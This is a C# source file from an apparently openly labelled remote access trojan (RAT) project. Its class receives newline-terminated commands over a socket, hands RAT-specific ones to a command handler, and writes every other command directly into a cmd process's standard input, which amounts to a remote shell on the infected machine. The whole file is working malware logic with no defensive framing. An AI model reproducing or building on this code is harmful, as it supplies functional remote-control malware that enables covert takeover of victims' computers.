using RAT.Interfaces;
using RAT.Models;
using System;
using System.Net.Sockets;
using System.Text;

namespace RAT.Logic.Sockets.Connection.SocketConnectionReceive
{
    /// <summary>
    /// Contains logic to process commands(cmd, rat) received by client.
    /// </summary>
    public class SocketConnectionCommandReceiveLogic : ISocketConnectionCommandReceiveLogic
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly IRatCommandLogic _ratCommandLogic;
        private readonly IClientNotificationLogic _clientNotificationLogic;

        /// <summary>
        /// Contains logic to process commands(cmd, rat) received by client.
        /// </summary>
        public SocketConnectionCommandReceiveLogic(
            ISocketStateLogic socketStateLogic,
            IRatCommandLogic ratCommandLogic,
            IClientNotificationLogic clientNotificationLogic)
        {
            _ratCommandLogic = ratCommandLogic;
            _socketStateLogic = socketStateLogic;
            _clientNotificationLogic = clientNotificationLogic;
        }

        /// <summary>
        /// Wrapper for command receive.
        /// </summary>
        /// <param name="socket">Our connection.</param>
        public void BeginCommandReceive(Socket socket)
        {
            var clientState = _socketStateLogic.State;
            socket.BeginReceive(
                clientState.CommandDataArray,
                0,
                clientState.CommandDataArray.Length,
                0,
                OnCommandReceive,
                clientState);
        }

        /// <summary>
        /// Command receival logic handling.
        /// </summary>
        /// <param name="asyncResult">Status of asynchronous operation.</param>
        private void OnCommandReceive(IAsyncResult asyncResult)
        {
            // Read data from the client socket.
            StateObject state = _socketStateLogic.GetStateFromAsyncResult(asyncResult);
            int bytesRead = this.EndReceiveAndGetReceivedBytesCount(state.ClientMainSocket, asyncResult);

            // There might be more data, so store the data received so far.
            state.DataBuilder.Append(Encoding.ASCII.GetString(state.CommandDataArray, 0, bytesRead));
            string content = state.DataBuilder.ToString();

            // Check if data was received at all.
            if (string.IsNullOrEmpty(content) && state.DataBuilder.Length == 0)
            {
                return;
            }

            // Check for end of command character (new line) in client command. If it is not there, read
            // more data.
            if (!content.Contains("\n"))
            {
                // Not all data received. Get more.
                this.BeginCommandReceive(state.ClientMainSocket);
            }
            else
            {
                this.ProceedWithCommandExecution(state);
            }
        }

        /// <summary>
        /// Handles client request after data is red.
        /// </summary>
        /// <param name="clientState">Current client state.</param>
        private void ProceedWithCommandExecution(StateObject clientState)
        {
            var command = clientState.DataBuilder.ToString();

            // Check if this is RAT related command
            if (_ratCommandLogic.IsRatCommand(command))
            {
                _ratCommandLogic.HandleRatCommand(command);
            }
            else
            {
                // Execute cmd command.
                clientState.ClientCmdProcess.StandardInput.WriteLine(command);
            }

            // Clear state data after command execution.
            clientState.DataBuilder.Clear(); // Command is stored here in string format.
            clientState.CommandDataArray = new byte[1024]; // Command is stored here in byte command.

            // Continue on listening for other commands.
            this.BeginCommandReceive(clientState.ClientMainSocket);
        }

        /// <summary>
        /// Ends data receival and gets bytes received.
        /// </summary>
        /// <param name="socket">Socket to get bytes count from.</param>
        /// <param name="result">Status of asynchronous operation.</param>
        /// <returns>Bytes received.</returns>
        private int EndReceiveAndGetReceivedBytesCount(Socket socket, IAsyncResult result)
        {
            int bytesReceved = 0;
            try
            {
                bytesReceved = socket.EndReceive(result);
            }
            catch (Exception exception)
            {
                _clientNotificationLogic.NotifyClient($"Error during data receive: {exception.Message}");
            }

            return bytesReceved;
        }
    }
}